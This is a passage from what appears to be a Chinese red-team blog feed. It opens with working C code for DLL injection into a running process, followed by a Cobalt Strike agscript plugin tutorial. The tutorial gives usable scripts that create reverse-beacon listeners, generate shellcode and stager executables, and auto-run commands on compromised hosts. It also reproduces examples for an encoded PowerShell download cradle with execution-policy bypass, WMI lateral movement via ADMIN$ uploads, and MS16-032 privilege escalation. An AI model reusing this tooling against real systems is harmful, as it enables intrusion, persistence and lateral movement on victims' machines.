&lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;typedef DWORD(WINAPI * pRtlCreateUserThread)(        HANDLE      ProcessHandle,        PSECURITY_DESCRIPTOR  SecurityDescriptor,        BOOL      CreateSuspended,        ULONG     StackZeroBits,        PULONG     StackReserved,        PULONG     StackCommit,        LPVOID     StartAddress,        LPVOID     StartParameter,        HANDLE      ThreadHandle,        LPVOID     ClientID        );DWORD findbyname(WCHAR *name) {        HANDLE p;        PROCESSENTRY32W p2;        p = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);        p2.dwSize = sizeof(PROCESSENTRY32);        printf(&quot;Proces Listlen:%d\n&quot;, p2.dwSize);        BOOL besult = Process32FirstW(p, &amp;p2);        int calc = 0;        while (besult!=FALSE) {               int pid = p2.th32ProcessID;               WCHAR *processname = p2.szExeFile;               if (wcscmp(processname, name) == 0) {                       printf(&quot;%d &quot;, pid);                       wprintf(processname);                       printf(&quot;\n&quot;);                       return pid;               }               besult=Process32NextW(p,&amp;p2);               calc++;        }        return 0;}void Errorcode() {        printf(&quot;,Error Code:%d\n&quot;, GetLastError());        exit(1);}DWORD dllinject(LPCSTR dll,int pid) {        HANDLE h;        h = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);        if (h == 0) {               printf(&quot;[-] OpenProcess failure&quot;);               Errorcode();        }        printf(&quot;[*] OpenProcess Sucess\n&quot;);        LPVOID moduleaddress =  (LPVOID)GetProcAddress(GetModuleHandle(TEXT(&quot;kernel32.dll&quot;)),&quot;LoadLibraryA&quot;);        if (moduleaddress == 0) {               printf(&quot;[-] GetProcAddress LoadLibraryW failure&quot;);               Errorcode();        }        printf(&quot;[*] GetProcAddress LoadLibraryW Address Sucess,Address=0x%x\n&quot;,  moduleaddress);        pRtlCreateUserThread RtlCreateUserThread = NULL;        RtlCreateUserThread =  (pRtlCreateUserThread)GetProcAddress(GetModuleHandle(TEXT(&quot;ntdll.dll&quot;)),  &quot;RtlCreateUserThread&quot;);        if (RtlCreateUserThread == 0) {               printf(&quot;[-] GetProcAddress RtlCreateUserThread failure&quot;);               Errorcode();        }        printf(&quot;[*] GetProcAddress RtlCreateUserThread Address Sucess,Address=0x%x\n&quot;,  RtlCreateUserThread);        //DWORD dwSize = (strlen(dll) + 1) * sizeof(char);        SIZE_T dwSize = strlen(dll);        LPVOID vt = VirtualAllocEx(h,0, dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);        if (vt == 0) {               printf(&quot;[-] VirtualAllocEx failure&quot;);               Errorcode();        }        printf(&quot;[*] VirtualAllocEx Sucess,Address=0x%x\n&quot;, vt);        BOOL dlladdress = WriteProcessMemory(h, vt, dll, dwSize, 0);        if (dlladdress == 0) {               printf(&quot;[-] WriteProcessMemory failure&quot;);               Errorcode();        }        printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);        HANDLE hRemoteThread = NULL;         RtlCreateUserThread(h, NULL, 0, 0, 0, 0, moduleaddress, vt,&amp;hRemoteThread, NULL);        printf(&quot;%d\n&quot;, GetLastError());        if (hRemoteThread ==0) {               printf(&quot;[-] RtlCreateUserThread failure&quot;);               Errorcode();               return 1;        }        printf(&quot;[*] RtlCreateUserThread Sucess\n&quot;);        printf(&quot;[+] Dll Inject Sucess\n&quot;);        return 0;}int main(){        WCHAR *processname = TEXT(&quot;notepad.exe&quot;);        LPCSTR dllpath = &quot;C:\\Users\\JiuShi\\Desktop\\ABC.dll&quot;;        printf(&quot;DLL PATH:&quot;);        printf(&quot;\n&quot;);        int pid=findbyname(processname);        dllinject(dllpath, pid);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/09/14/wBYpM8.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cs插件开发</title>
      <link href="/posts/e5e87074.html"/>
      <url>/posts/e5e87074.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1459722976&auto=1&height=66"></iframe><p>之前就有开发cs插件的意向，当时看了文档表示哪里有”老婆”好看就关闭了文档<br>现在重新打开看了一遍，所以写个笔记<br>注：本文大量参考先知社区的三篇cs开发文章，文章底部会给出参考链接</p><p>首发WBG的git books</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p> agscript是Armitage的开源脚本引擎Cortana的精神继承者。 因为DARPA的Cyber Fast Track计划才使Cortana成了可能。 Cortana支持开发者通过Armitage的团队服务器扩展Armitage并控制Metasploit Framework及其功能。 当然，Cobalt Strike 3.0并不是以Armitage为基础的重写的。 这次大弧度的版本升级是为了重新审视Cobalt Strike，并围绕Cobalt Strike的功能进行重构。 产物就是agscript的诞生。<br>agscript是一种简单脚本语言，主要用于红队编写针对肉鸡的攻击脚本。 它有两个作用，一是可以用来对自己的肉鸡做持久性控制，二是可以用来扩展或修改Cobalt Strike客户端以满足您的个性化需求。</p><p>agscript是以Cobalt Strike 3.0为基础的。 Cobalt Strike 3.0中绝大部分菜单/按钮事件都是由agscript引擎支撑。 Strategic Cyber LLC尚未为Cobalt Strike的大多数功能写API，也就是说，agscript目前仍处于起步阶段。 在未来，我们也期待看到agscript的发展壮大。这份文档也会<strong>随着时间的推移而变动</strong>。</p><h2 id="加载cs脚本"><a href="#加载cs脚本" class="headerlink" title="加载cs脚本"></a>加载cs脚本</h2><p>如何加载脚本?agscript内置于Cobalt Strike 客户端，如果需要长期使用agscript,<br>请移步Cobalt Strike客户端 -&gt; Script Manager and press Load功能。<br><img src="/images/cs/cs.png" alt=""></p><h2 id="脚本控制台"><a href="#脚本控制台" class="headerlink" title="脚本控制台"></a>脚本控制台</h2><p>Cobalt Strike提供了交互式的脚本控制台。 通过控制台可跟踪，配置，调试以及管理脚本。可以通过View- &gt; Script Console获得进入agscript控制台。<br>基础命令：<br><img src="/images/cs/command.png" alt=""></p><p><img src="/images/cs/1.png" alt=""></p><h2 id="命令行使用Cobalt-Strike"><a href="#命令行使用Cobalt-Strike" class="headerlink" title="命令行使用Cobalt Strike"></a>命令行使用Cobalt Strike</h2><p>(注意：cmd得进入到agscript的路径里，否则会出现无法加载主体的情况)您也许会希望在在没有GUI的情况下启动Cobalt Strike，客户端压缩包中的agscript这个脚本文件能够满足您的需求，连接命令：</p><pre><code>./agscript [host] [port] [user] [password]</code></pre><p>远程连接cs并执行脚本</p><pre><code>./agscript [host] [port] [user] [password] [/path/to/script.cna]</code></pre><p>test.cna</p><pre><code>on ready {    println(&quot;Hello cs&quot;);    closeClient();}</code></pre><p><img src="/images/cs/hello.png" alt=""></p><p><img src="/images/cs/runhello.png" alt=""></p><h2 id="Sleep语言基础"><a href="#Sleep语言基础" class="headerlink" title="Sleep语言基础"></a>Sleep语言基础</h2><p>agscript是基于Raphael Mudge的Sleep语言的二次开发的。<br>原手册见：<a href="http://sleep.dashnine.org/manual" target="_blank" rel="noopener">http://sleep.dashnine.org/manual</a></p><p>注释符： #</p><p>Sleep能做的agscript都能做，下面是一些注意事项：Sleep的语法，运算符甚至俚语都与Perl极其类似,简单说一个他们的区别,Sleep需要的语句之间需要有空格，以下代码无效：（关键：但凡你少一个空格都能给你报错或者不输出，例如:println(“a=&gt;$a”)，他不会给你输出出来）</p><pre><code>$x=1+2; # 错误$x = 1+2; #正确</code></pre><p>错误例子：<br><img src="/images/cs/error.png" alt=""></p><p>正确例子:<br><img src="/images/cs/sucess.png" alt=""></p><p>Sleep的变量有标量，字符串，各自类型的数字，Java对象引用，函数，数组以及字典等。<br>以下是Sleep中的常见的几种变量：</p><pre><code>$x = &quot;Hello World&quot;;$y = 3;$z = @(1, 2, 3, &quot;four&quot;); #数组 $a = %(a = &gt; &quot;apple&quot;, b = &gt; &quot;bat&quot;, c = &gt; &quot;awesome language&quot;, d = &gt; 4); #字典</code></pre><p>Sleep会插入双引号的字符串，这意味着以\$符号开头的任何以空格分隔的标记都将替换为其值。<br>特殊变量$+将插字符串与另一个值连接起来。</p><pre><code>println(&quot;\$a is: $a and \n\$x joined with \$y is: $x $+ $y&quot;);</code></pre><p><img src="/images/cs/2.png" alt=""></p><p>有一个和println类似的函数叫warn，不同的是warn输出的内容中包含了当前代码的文件名和行数<br>一般用于调试错误<br><img src="/images/cs/warn.png" alt=""></p><p>使用sub字符即可声明函数，传给函数的参数标记为$1,$2,一直到$n。函数可以接受无数个参数。<br>变量@<em>是一个包含所有参数的数组，$1，$2等变量的更改将改变@</em>的内容。</p><pre><code>sub addTwoValues {    println($1  +  $2);}addTwoValues(&quot;3&quot;, 55.0);</code></pre><p><img src="/images/cs/sub.png" alt=""></p><p>字典的使用</p><pre><code>on ready {    $x = 3;    %foo[&quot;name&quot;] = &quot;Raphael&quot;;//这tm还能自己创建一个字典    %foo[&quot;job&quot;]  = &quot;wasting time&quot;;     %foo[$x]     = &quot;Michelangelo&quot;;     println(&quot;%foo is: &quot; . %foo);     foreach $data (keys(%foo)){         //遍历字典 println(&quot;$data =&gt;&quot;.%foo[$data]);     }         closeClient(); } 遍历字典第二个方法foreach $key = &gt; $value (%foo) {    println(&quot;$key =&gt; $value&quot;);}删除字典的某个keyon ready {    $x = 3;    %a = %(data = &gt; &quot;aaa&quot;, data2 = &gt; &quot;bbbb&quot;);    removeAt(%a, &quot;data&quot;);    #或者删除多个key可以这么写 removeAt(%a, &quot;data&quot;, &quot;data2&quot;);    println(%a);    closeClient();}</code></pre><p><img src="/images/cs/dict.png" alt=""></p><p>数组的增、删、改、查</p><pre><code>on ready {    $x = 3;    $a = @(&quot;data&quot;);    add($a, &quot;wYYYYYYYYYYYYYYYYYYYYYYYY&quot;, - 1); #数组添加，默认在tm，0位前添加, 需要自己指定位置     println($a);    println($a[ - 1]);#查询         closeClient();}#数组遍历 on ready {    $data = @(1, 2, 3, 4, 5, 6, 7, 8);    foreach $index ($data) {        println($index);    }    closeClient();}</code></pre><p><img src="/images/cs/listforeach.png" alt=""></p><pre><code>on ready {    $x = 3;    $a = @(&quot;data&quot;);    add($a, &quot;wYYYYYYYYYYYYYYYYYYYYYYYY&quot;, - 1); #数组添加，默认在tm，0位前添加, 需要自己指定位置 println($a);    remove($a, - 1, &quot;data&quot;);//得指定删除的内容。。。     println($a);     closeClient(); }</code></pre><p><img src="/images/cs/listdel.png" alt=""></p><p>逻辑判断<br>（and-&gt;&amp;&amp;,or-&gt;|,true,false）<br><img src="/images/cs/bool.png" alt=""></p><pre><code>on ready {    $x = 3;    if ($x == 3)  {        println(1);    }    closeClient();}</code></pre><p><img src="/images/cs/bool2.png" alt=""></p><p>判断是不是数组之类的操作<br><img src="/images/cs/bool3.png" alt=""></p><pre><code>on ready {    $data = @(&quot;data&quot;);    if (! - isnumber $data)  {        println(1);    }    closeClient();}</code></pre><p><img src="/images/cs/isnumber.png" alt=""></p><p>循环</p><pre><code>sub range {    # Returns a new function that returns the next number in the    # range with each call.  Returns $null at the end of the range    # Don&#39;t worry, closures will come in the next chapter :)        return lambda( {        return iff($begin &lt;= $end, $begin++  -  1, $null);    }, $begin = &gt; $1, $end = &gt; $2);}on ready {    foreach $value (range(1, 10)) {        println($value);    }    closeClient();}</code></pre><p><img src="/images/cs/foreach.png" alt=""></p><p>字符串处理</p><pre><code>$a = &quot;data&quot;.&quot;data&quot;;#字符串的拼接 #字符串替换 on ready {    $a = &quot;data&quot;.&quot;data&quot;;    $a = replace($a, &quot;data&quot;, &quot;Fk&quot;);    println($a);    closeClient();}#获取字符串长度 $data = &quot;dataing&quot;;println(strlen($data));#获取字符串指定位置 $data = &quot;dataing&quot;;println(substr($data, 0, 3));#字符串指定内容替换成数组 （函数奇葩的要命，草） $a = &quot;data&quot;.&quot;.data&quot;;$b = split(&#39;.&#39;, $a);println($b);#数组转字符串 println(join(&#39;|&#39;, @(&quot;ape&quot;, &quot;bat&quot;, &quot;cat&quot;, &quot;dog&quot;)));</code></pre><p>判断一个字符串是否在数组里</p><pre><code>$data = @(&quot;abc&quot;, &quot;bqe&quot;);$str = &quot;abc&quot;;if ($str in $data)  {    println(111);}</code></pre><p>文件读写</p><pre><code>逐行读取文件 $handle = openf(&quot;/etc/passwd&quot;);while $text (readln($handle)) {    println(&quot;Read: $text&quot;);}一次性读完$handle = openf(&quot;/path/to/key.pem&quot;);$keydata = readb($handle, - 1);closef($handle);写入文件 $handle = openf(&quot;&gt;data.txt&quot;);println($handle, &quot;this is some data.&quot;);closef($handle);写入文件方法2 $handle = openf(&quot;&gt;out.txt&quot;);writeb($handle, $data);closef($handle);</code></pre><p>更多操作参考文档</p><h2 id="CS开发-命令快捷键"><a href="#CS开发-命令快捷键" class="headerlink" title="CS开发 - 命令快捷键"></a>CS开发 - 命令快捷键</h2><pre><code>command test {    println(&quot;value: $1&quot;);}</code></pre><p><img src="/images/cs/cscommand.png" alt=""></p><h2 id="CS开发-控制台颜色设置"><a href="#CS开发-控制台颜色设置" class="headerlink" title="CS开发 - 控制台颜色设置"></a>CS开发 - 控制台颜色设置</h2><p>如果你想给Cobalt Strike的控制台添加一些色彩，通过\c，\U和\o转义即可告诉Cobalt Strike如何格式化文本。 值得提醒的是这些转义仅在双引号字符串内有效。\cX就是告诉Cobalt Strike你想输出什么颜色，X是颜色的值<br><img src="/images/cs/color.png" alt=""><br>U是告诉控制台添加下划线，\o则是重置这些花里胡哨的东西。<br><img src="/images/cs/color2.png" alt=""></p><h2 id="CS开发-快捷键绑定"><a href="#CS开发-快捷键绑定" class="headerlink" title="CS开发 - 快捷键绑定"></a>CS开发 - 快捷键绑定</h2><pre><code>bind Ctrl + H {    show_message(&quot;DIO&quot;);}</code></pre><p>快捷键可以是任何ASCII字符或特殊键，快捷方式可能会应用一个或多个修饰符，修饰符修饰符仅为以下几个特定按键：Ctrl，Shift，Alt，Meta。脚本可以指定修饰符+键。<br>按Ctrl+H效果如下<br><img src="/images/cs/bind.png" alt=""></p><h2 id="CS开发-弹出菜单"><a href="#CS开发-弹出菜单" class="headerlink" title="CS开发 - 弹出菜单"></a>CS开发 - 弹出菜单</h2><pre><code>popup help {    item(&quot;&amp;blog&quot;, {        url_open(&quot;https://422926799.github.io&quot;);    }    );    item(&quot;&amp;System Information&quot;, {        openSystemInformationDialog();    }    );}</code></pre><p><img src="/images/cs/map.png" alt=""></p><p><img src="/images/cs/map2.png" alt=""></p><p>添加子菜单</p><pre><code>popup help {    item(&quot;&amp;blog&quot;, {        url_open(&quot;https://422926799.github.io&quot;);    }    );    menu &quot;&amp;Testing&quot; {        #Testing菜单下会有blog         item(&quot;&amp;blog&quot;, {            url_open(&quot;https://422926799.github.io&quot;);        }        );    }}</code></pre><p><img src="/images/cs/map3.png" alt=""></p><h2 id="CS开发-自定义输出"><a href="#CS开发-自定义输出" class="headerlink" title="CS开发 - 自定义输出"></a>CS开发 - 自定义输出</h2><pre><code>set EVENT_SBAR_LEFT {    return &quot;[&quot; . tstamp(ticks()) . &quot;] &quot; . mynick();}set EVENT_SBAR_RIGHT {    return &quot;[lag: $1 $+ ]&quot;;}</code></pre><p>上面的代码定义了Cobalt Strike的事件日志（View -&gt; Event Log）中状态栏的内容，此状态栏的左侧显示当前时间和您的昵称，右侧显示了Cobalt Strike客户端和团队服务器之间的消息往返时间。Cobalt Strike中默认的各种设置都可以通过统一的方法来修改覆盖</p><p>测试了一下貌似并没有什么变化<br><img src="/images/cs/set.png" alt=""></p><h2 id="CS开发-事件管理"><a href="#CS开发-事件管理" class="headerlink" title="CS开发 - 事件管理"></a>CS开发 - 事件管理</h2><p>使用on这个关键字可以为事件定义处理程序，当Cobalt Strike连接到团队服务器并准备代表您行动时，就绪事件将触发</p><pre><code>on ready {    show_message(&quot;舰长，我的狐狸耳朵，喜欢吗？&quot;);}</code></pre><p><img src="/images/cs/ready.png" alt=""></p><p>使用* meta-event可查看再Cobalt Strike中发生的所有事件。</p><pre><code>on  * { #加载脚本的时候就运行    local(&#39;$handle $event $args&#39;);    $event = shift(@_);    $args = join(&quot; &quot;, @_);    $handle = openf(&quot;&gt;&gt;eventspy.txt&quot;);    writeb($handle, &quot;[ $+ $event $+ ] $args&quot;);    closef($handle);}</code></pre><p><img src="/images/cs/evt.png" alt=""></p><h2 id="CS数据模型"><a href="#CS数据模型" class="headerlink" title="CS数据模型"></a>CS数据模型</h2><p><img src="/images/cs/datax.png" alt=""><br>调用这些函数会返回一个模型中每个条目的数组，每行对于的是一个字典，字典中包含了键与其键值。<br><img src="/images/cs/info.png" alt=""></p><h2 id="CS开发-监听器信息"><a href="#CS开发-监听器信息" class="headerlink" title="CS开发 - 监听器信息"></a>CS开发 - 监听器信息</h2><p>agscript会收集来自连接到的当前团队服务器的监听器的信息，这样做的好处是可以轻松地将会话转移给另一台团队服务器，想要获取所有监听器名称的列表可以使用＆listeners函数,只使用本地侦听器的话用＆listeners_local函数,＆listener_info函数可将监听器名称解析为其配置信息<br><img src="/images/cs/listen2.png" alt=""></p><pre><code>command list {    println(&quot;监视器&quot;);    println(&quot;------------------------------------------------------&quot;);    foreach $listener (listeners()) {        println(&quot;name: $listener&quot;);        println(&quot;---------- $listener --------------&quot;);        %data = listener_info($listener);        foreach $key = &gt; $value (%data) {            println(&quot;$key =&gt; $value&quot;);        }        println(&quot;&quot;);        println(&quot;&quot;);    }}</code></pre><p><img src="/images/cs/listen3.png" alt=""></p><p>监听器常用的函数：<br><img src="/images/cs/listeninfo.png" alt=""></p><p>简单的做一个插件</p><pre><code>command list{    println(&quot;监视器&quot;);    println(&quot;------------------------------------------------------&quot;);    foreach $listener (listeners()){        println(&quot;name: $listener&quot;);        println(&quot;---------- $listener --------------&quot;);        %data = listener_info($listener); #解析监听器获取监听器详细信息        foreach $key =&gt; $value (%data){            println(&quot;$key =&gt; $value&quot;);        }        println(&quot;&quot;);        println(&quot;&quot;);    }}command list_create{    $name = $1;    $payload = $2;    $host = $3;    $port = $4;    $beacons = $5;    $payloads = @(&quot;windows/beacon_dns/reverse_dns_txt&quot;, &quot;windows/beacon_http/reverse_http&quot;, &quot;windows/beacon_http/reverse_https&quot;, &quot;windows/beacon_bind_pipe&quot;, &quot;windows/beacon_bind_tcp&quot;, &quot;windows/beacon_extc2&quot;, &quot;windows/foreign/reverse_http&quot;, &quot;windows/foreign/reverse_https&quot;);    if ((strlen($name)  &gt; 0) &amp;&amp; (strlen($payload) &gt; 0) &amp;&amp; (strlen($host) &gt; 0) &amp;&amp; (strlen($port) &gt; 0) &amp;&amp; (strlen($beacons) &gt; 0)){        if($payload in $payloads){            listener_create($name, $payload, $host, $port, $beacons); #新建监听器            println(&quot;create listen sucess:&quot;);            println(&quot;Listen_name: $name&quot;);            println(&quot;payload: $payload&quot;);            println(&quot;host: $host&quot;);            println(&quot;port: $port&quot;);            println(&quot;beacons: $beacons&quot;);        }else{            println(&quot;\c5Not Found payload:&quot;.$payload);            println(&quot;payload-&gt;&quot;);            foreach $p ($payloads){                println(&quot;$p&quot;);            }        }    }else{        println(&quot;list_create &lt;listen_name&gt; &lt;payload&gt; &lt;host&gt; &lt;port&gt; &lt;beacons&gt;&quot;);        println(&quot;\c8Multiple bacons are separated by commas&quot;);        println(&quot;Example:list_create test3 windows/beacon_http/reverse_http 192.168.1.108 9090 192.168.1.108&quot;);        println(&quot;\c8Supported payload:&quot;);        foreach $p ($payloads){            println($p);        }    }}command list_del{    $name = $1;    if(strlen($name) &gt; 0){        if ($name in listeners()){            listener_delete($name);            println(&quot;del listen: $name Sucess&quot;); #删除监听器        }else{            println(&quot;\c5Not found listen name:&quot;.$name);            println(&quot;list listen:&quot;)            foreach $n (listeners()){                println($n);            }        }    }else{        println(&quot;list_del &lt;listen_name&gt;&quot;);        println(&quot;Example:list_del test3&quot;);    }}</code></pre><p>效果如下<br>监听器查询<br><img src="/images/cs/listenquery.png" alt=""></p><p>监听器创建<br><img src="/images/cs/listencreate.png" alt=""></p><p><img src="/images/cs/listencreate2.png" alt=""></p><p><img src="/images/cs/listensucess.png" alt=""></p><p>监听器删除<br><img src="/images/cs/listendel.png" alt=""></p><p>监听器选择<br>示例代码有个用UI创建监听器的</p><pre><code>item &quot;&amp;Spawn&quot; {    openPayloadHelper(lambda({        binput($bids, &quot;spawn $1&quot;); #在指定的机器上执行指定的操作（子 进 程）        bspawn($bids, $1); #要求信标产生一个新的会话    }, $bids =&gt; $1));}修改popup beacon_bottom{    item &quot;&amp;NewSpawn&quot; {        openPayloadHelper(lambda({            binput($bids, &quot;spawn $1&quot;);            bspawn($bids, $1);        }, $bids =&gt; $1));    }}</code></pre><p><img src="/images/cs/newspawn.png" alt=""></p><p>从上线的机器里在上线，就是spawn的功能<br><img src="/images/cs/newspacn2.png" alt=""></p><h2 id="CS开发-shellcode生成"><a href="#CS开发-shellcode生成" class="headerlink" title="CS开发 - shellcode生成"></a>CS开发 - shellcode生成</h2><pre><code>command shellcode_create{    $listenname = $1;    $handle = $2;    $arch = $3;    if((strlen($listenname) &gt; 0) &amp;&amp; (strlen($handle) &gt; 0) &amp;&amp; (strlen($arch) &gt; 0)){        println(&quot;Arch: $arch&quot;);        println(&quot;listen name: $listenname&quot;);        println(&quot;handle: $handle&quot;);        $data = shellcode($listenname, $handle, $arch);        $dk = openf(&quot;&gt;shellcode.bin&quot;);        writeb($dk, $data);        closef($dk);        println(&quot;create shellcode.bin sucess&quot;);    }else{        println(&quot;shellcode_create &lt;listenname&gt; &lt;remote_host&gt; &lt;arch&gt;&quot;);    }}</code></pre><p><img src="/images/cs/shellcodecreate.png" alt=""></p><h2 id="CS开发-exe-dll开发"><a href="#CS开发-exe-dll开发" class="headerlink" title="CS开发 - exe/dll开发"></a>CS开发 - exe/dll开发</h2><p>分段马生成</p><pre><code>command payload_create{    $filename = $1;    $listenname = $2;    $format = $3;    $arch = $4;    if((strlen($filename) &gt; 0) &amp;&amp; (strlen($listenname) &gt; 0) &amp;&amp; (strlen($format) &gt; 0) &amp;&amp; (strlen($arch) &gt; 0)){        $data = artifact_stager($listenname, $format, $arch);        $dk = openf(&quot;&gt;$filename&quot;);        writeb($dk, $data);        closef($dk);        println(&quot;create payload: $filename Sucess&quot;);    }else{        println(&quot;payload_create &lt;payload_create&gt; &lt;listenname&gt; &lt;format&gt; &lt;arch&gt;&quot;);    }}</code></pre><p><img src="/images/cs/active.png" alt=""></p><p>分段马生成</p><pre><code>sub ready {    local(&#39;$handle&#39;);    $handle = openf(&quot;&gt;beacon.exe&quot;);    writeb($handle, $1);    closef($handle);}artifact_stageless(&quot;my listener&quot;, &quot;exe&quot;, &quot;x86&quot;, &quot;&quot;, &amp;ready);</code></pre><p>还有powershell生成之类的，就不写了</p><h2 id="CS开发-beacon信息获取"><a href="#CS开发-beacon信息获取" class="headerlink" title="CS开发 - beacon信息获取"></a>CS开发 - beacon信息获取</h2><pre><code>command beacons{    foreach $entry (beacons()){        println(&quot;=========ip:\c9&quot;.$entry[&quot;external&quot;].&quot;\o=========&quot;.&quot;user:\c9&quot;.$entry[&quot;user&quot;].&quot;\o=========&quot;.&quot;pid:\c9&quot;.$entry[&quot;pid&quot;].&quot;\o=========&quot;.&quot;arch:\c9&quot;.$entry[&quot;arch&quot;].&quot;\o=========&quot;.&quot;computer:\c9&quot;.$entry[&quot;computer&quot;]);        foreach $key =&gt; $value ($entry){            println(&quot;$key =&gt; $value&quot;);        }        println(&quot;&quot;);    }}</code></pre><p><img src="/images/cs/beaconinfo.png" alt=""></p><h2 id="CS开发-处理新的beacons会话"><a href="#CS开发-处理新的beacons会话" class="headerlink" title="CS开发 - 处理新的beacons会话"></a>CS开发 - 处理新的beacons会话</h2><p>为给新的Beacons会话添加一个自动运行的脚本，或者是让所有的新会话都运行一遍写好的功能</p><pre><code>on beacon_initial{    binput($1, &quot;shell whoami&quot;);}</code></pre><p>新机器一上线就会自动执行这个函数里的功能<br><img src="/images/cs/setx.png" alt=""></p><h2 id="CS开发-beacon操控"><a href="#CS开发-beacon操控" class="headerlink" title="CS开发 - beacon操控"></a>CS开发 - beacon操控</h2><p><strong>alias</strong><br>类似于在agscript控制台定义命令的command一样，不过alias是给beacon控制操控的</p><pre><code>alias test{    bshell!($1, &quot;whoami&quot;);}</code></pre><p><img src="/images/cs/alias.png" alt=""></p><p><strong>已上线的机器右键菜单</strong></p><pre><code>popup beacon_bottom{    item &quot;query user&quot;{        prompt_text(&quot;Query User&quot;, &quot;administrator&quot;, lambda({            bshell(@ids, &quot;net user &quot;.$1);        }, @ids =&gt; $1));    }}</code></pre><p><img src="/images/cs/prompt_text.png" alt=""></p><p><img src="/images/cs/prompt_text2.png" alt=""></p><p><img src="/images/cs/prompt_text3.png" alt=""></p><p>询问框框等的常见操作，可以参考文档里的这里：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#prompt_text" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#prompt_text</a></p><p><strong>右键菜单(子菜单/多菜单)</strong></p><pre><code>popup beacon_bottom{    menu &quot;test&quot;{        item &quot;query user&quot;{            prompt_text(&quot;Query User&quot;, &quot;administrator&quot;, lambda({                bshell($ids, &quot;net user &quot;.$1);            }, $ids =&gt; $1));        }        item &quot;run command&quot;{            prompt_text(&quot;Run command&quot;, &quot; &quot;, lambda({                bshell($ids, $1);            }, $ids =&gt; $1));        }    }}</code></pre><p><img src="/images/cs/menu.png" alt=""></p><p><strong>文件上传</strong><br>这里的文件上传，要么把要上传的文件放到当前插件的目录。要么用bcd切换工作目录，在进行bupload</p><pre><code>alias uploadtest{    bupload($1, script_resource(&quot;calc.exe&quot;));    bmv($1, &quot;calc.exe&quot;, &quot;C:\\Temp\\dio.exe&quot;); #上传的文件移动到指定的路径}</code></pre><p><img src="/images/cs/beaconupload.png" alt=""></p><p><strong>task</strong><br>用于叙述任务</p><pre><code>alias task{    btask($1, &quot;This is Task,so ?&quot;);    bshell($1, &quot;echo this is task&quot;);}</code></pre><p><img src="/images/cs/task.png" alt=""></p><h2 id="CS开发-官方案例"><a href="#CS开发-官方案例" class="headerlink" title="CS开发 - 官方案例"></a>CS开发 - 官方案例</h2><p><strong>已有指令覆盖</strong><br>Aliases添加的快捷指令可以覆盖已存在的命令，直接看一个覆盖内置powershell指令</p><pre><code>alias powershell {    local(&#39;$args $cradle $runme $cmd&#39;); #定义变量    # $0 is the entire command with no parsing.    $args   = substr($0, 11); #$0是获取输入的原始指令，使用substr函数获取第十一个字符之后的字符串(&quot;powershell&quot;十个字符串加一个空格)    # generate the download cradle (if one exists) for an imported PowerShell script    $cradle = beacon_host_imported_script($1); #将马子放到web，用于准备下载执行    # encode our download cradle AND cmdlet+args we want to run    $runme  = base64_encode( str_encode($cradle . $args, &quot;UTF-16LE&quot;) ); #将命令和脚本base64编码，这里编码成utf-16是因为powershell的base64默认编码是utf-16的    # Build up our entire command line.    $cmd    = &quot; -nop -exec bypass -EncodedCommand \&quot; $+ $runme $+ \&quot;&quot;; #拼接指令    # task Beacon to run all of this.    btask($1, &quot;Tasked beacon to run: $args&quot;, &quot;T1086&quot;); #任务描述    beacon_execute_job($1, &quot;powershell&quot;, $cmd, 1); #使用beacon_execute_job函数执行命令并返回结果给Beacon}</code></pre><p><strong>横向移动</strong></p><pre><code>alias wmi-alt {    local(&#39;$mydata $myexe&#39;);    # check if our listener exists    if (listener_info($3) is $null) {        berror($1, &quot;Listener $3 does not exist&quot;);        return;    }    # generate our executable artifact    $mydata = artifact($3, &quot;exe&quot;, true); #马子生成    # generate a random executable name    $myexe  = int(rand() * 10000) . &quot;.exe&quot;; #随机名称    # state what we&#39;re doing.    btask($1, &quot;Tasked Beacon to jump to $2 (&quot; . listener_describe($3, $2) . &quot;) via WMI&quot;, &quot;T1047&quot;);    # upload our executable to the target    bupload_raw!($1, &quot;\\\\ $+ $2 $+ \\ADMIN$\\ $+ $myexe&quot;, $mydata); #文件上传到目标    # use wmic to run myexe on the target    bshell!($1, &quot;wmic /node: $+ $2 process call create \&quot;c:\\windows\\ $+ $myexe $+ \&quot;&quot;); #wmic运行上传的马子    # complete staging process (for bind_pipe listeners)    bstage($1, $2, $3); #已删除此功能在Cobalt Strike 4.0中已删除。 使用＆beacon_stage_tcp或＆beacon_stage_pipe显式暂存有效负载。 使用＆beacon_link链接到它。}</code></pre><p><strong>提权</strong></p><pre><code>sub ms16_032_exploit {    local(&#39;$script $oneliner&#39;);    # acknowledge this command    btask($1, &quot;Tasked Beacon to run &quot; . listener_describe($2) . &quot; via ms16-032&quot;, &quot;T1068&quot;);    # generate a PowerShell script to run our Beacon listener    $script = artifact($2, &quot;powershell&quot;); #根据指定的监听器生成马子内容    # host this script within this Beacon    $oneliner = beacon_host_script($1, $script); #将马子放到web，用于准备下载执行    # task Beacon to run this exploit with our one-liner that runs Beacon    bpowershell_import!($1, script_resource(&quot;Invoke-MS16032.ps1&quot;)); #导入powershell脚本    bpowerpick!($1, &quot;Invoke-MS16032 -Command \&quot; $+ $oneliner $+ \&quot;&quot;); #生成一个新的进程注入powershell脚本    # handle staging (if we&#39;re dealing with a named pipe Beacon; does nothing otherwise)    bstage($1, $null, $2);}</code></pre><p>远程主机powershell使用例子<br>beacon_host_script重新说明一下：用于将指定的powershell脚本/内容，放到web。生成远程调用命令<br>bpowerpick：在目标机执行powershell command</p><pre><code>alias test{    $path = &quot;test.ps1&quot;;    $script = &quot;wmic process call create calc&quot;;    $oneliner = beacon_host_script($1, $script); #将马子放到web，用于准备下载执行    bpowerpick($1, $oneliner); #新开进程注入powershell脚本}</code></pre><p><img src="/images/cs/powershell.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/5887" target="_blank" 